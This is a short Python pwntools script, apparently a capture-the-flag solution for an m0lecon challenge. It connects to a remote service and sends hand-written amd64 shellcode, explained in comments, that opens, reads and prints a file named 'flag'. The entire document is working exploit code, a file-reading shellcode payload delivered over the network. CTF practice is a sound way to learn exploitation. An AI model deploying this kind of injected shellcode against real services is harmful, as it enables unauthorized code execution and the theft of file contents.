#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13445

context.update(arch= 'amd64', os='linux')

def make_payload():
    #assembly to read flag
    #The arguments are passed in this order: rdi, rsi, rdx, and the system call number goes in rax.

    #first push "flag" into the stack. We are pushing the litteral value.
    #then initialize rdi to the value of the sp, which points to the string containing flag
    #then other params, 0 in rsi (readonly flag), 0 in rdx (another param not needed), then syscall num 2 into rax

    #the returned file descriptor: in rax. It becomes first argument of the read (syscall 0 in rax)
    #the 2nd argument is the buffer, we use the same string that contained flag, pointed by the sp, and 3rd argument n bytes to read, 100
    #again, result of the read (bytes read) into rax
    #now call the write, first arg n_bytes to write, then the fd to write (1= stdout), then syscall num = 1

    shellcode_asm = """
        /* 1. Open 'flag' */
        push 0x67616c66 
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 2
        syscall

        /* 2. Read(fd, stack, 100) */
        mov rdi, rax
        mov rsi, rsp
        mov rdx, 100
        xor rax, rax
        syscall

        /* 3. Write(1, stack, len) */
        mov rdx, rax
        mov rdi, 1
        mov rax, 1
        syscall
    """

    #assemble it into bytes
    shellcode_b = asm(shellcode_asm)

    payload = shellcode_b

    return payload

def main():

    io = remote(HOST, PORT)
    g = io.recvuntil(b'Be careful, we have some restrictions in place...\n')
    print(g)
    
    payload = make_payload()
    io.sendline(payload)

    # read remainder of program output
    io.interactive()

if __name__ == '__main__':
    main()
